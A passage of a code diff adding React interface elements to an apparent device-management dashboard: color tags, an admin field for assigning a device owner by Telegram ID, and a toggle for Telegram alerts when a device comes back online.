+                      <button
+                        key={c}
+                        onClick={() => setColorTag(colorTag === c ? "" : c)}
+                        className="w-7 h-7 rounded-full transition-all"
+                        style={{
+                          background: c,
+                          boxShadow:
+                            colorTag === c
+                              ? "0 0 0 2px white, 0 0 0 4px " + c
+                              : "none",
+                        }}
+                        aria-label={"color " + c}
+                      />
+                    ))}
+                  </div>
+                  <button
+                    onClick={handleSaveLabel}
+                    className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors w-full"
+                  >
+                    Save Label & Group
+                  </button>
+                </div>
+                {isAdmin && (
+                  <div className="space-y-2 pt-2 border-t border-card-border">
+                    <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
+                      <UserCheck className="w-3.5 h-3.5" /> Assign Owner
+                    </label>
+                    <div className="flex gap-2">
+                      <input
+                        type="text"
+                        value={ownerInput}
+                        onChange={(e) => setOwnerInput(e.target.value)}
+                        placeholder="Telegram ID..."
+                        className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all min-w-0"
+                      />
+                      <button
+                        onClick={handleSaveOwner}
+                        disabled={savingOwner}
+                        className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors disabled:opacity-50 whitespace-nowrap"
+                      >
+                        {savingOwner ? "..." : "Save"}
+                      </button>
+                    </div>
+                    <p className="text-[10px] text-muted-foreground">
+                      Only this user will be able to see this device
+                    </p>
+                  </div>
+                )}
+                <div className="space-y-2 pt-2 border-t border-card-border">
+                  <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
+                    <BellRing className="w-3.5 h-3.5" /> Online Alert
+                  </label>
+                  <button
+                    onClick={toggleOnlineAlert}
+                    className={`w-full flex items-center justify-between px-4 py-2.5 rounded-2xl text-sm font-semibold transition-colors border ${
+                      alertOnline
+                        ? "bg-success/10 text-success border-success/30"
+                        : "bg-card text-muted-foreground border-input hover:bg-muted/50"
+                    }`}
+                  >
+                    <span className="flex items-center gap-2">
+                      <BellRing className="w-4 h-4" />
+                      {alertOnline ? "Active" : "Off"}
+                    </span>
+                    <span
+                      className={`relative inline-flex h-5 w-9 items-center rounded-full transition-colors ${alertOnline ? "bg-success" : "bg-muted"}`}
+                    >
+                      <span
+                        className={`inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform ${alertOnline ? "translate-x-[18px]" : "translate-x-0.5"}`}
+                      />
+                    </span>
+                  </button>
+                  <p className="text-[10px] text-muted-foreground">
+                    Jab device dobara online aaye toh Telegram pe notification
+                    milegi
+                  </p>
+                </div>
+              </div>
             </div>
           </div>
         </div>
